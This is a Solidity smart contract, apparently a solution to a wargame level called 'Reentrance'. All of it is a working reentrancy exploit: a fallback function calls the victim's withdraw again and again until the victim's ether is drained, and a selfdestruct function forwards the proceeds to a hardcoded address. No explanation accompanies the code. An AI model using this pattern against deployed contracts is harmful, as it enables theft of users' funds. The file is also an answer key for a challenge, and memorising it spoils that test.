// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/math/SafeMath.sol";
import "./Reentrance.sol";

contract ReentrancyAttacker {
    Reentrance R;
    constructor(address payable victim) public{
        R = Reentrance(victim);
    }
    function attack() public payable{
        require(msg.value >= 0.001 ether);
        R.donate{value: 0.001 ether}(address(this));
        R.withdraw(1000000000000000);
    }
    fallback() external payable{
        if (address(R).balance >= 0.001 ether) {
            R.withdraw(1000000000000000);
        }
    }
    function destructor() public{
        selfdestruct(payable(0x765a392Bbf9321157478cb9934F3Fe6492c35CbD));
    }
  
}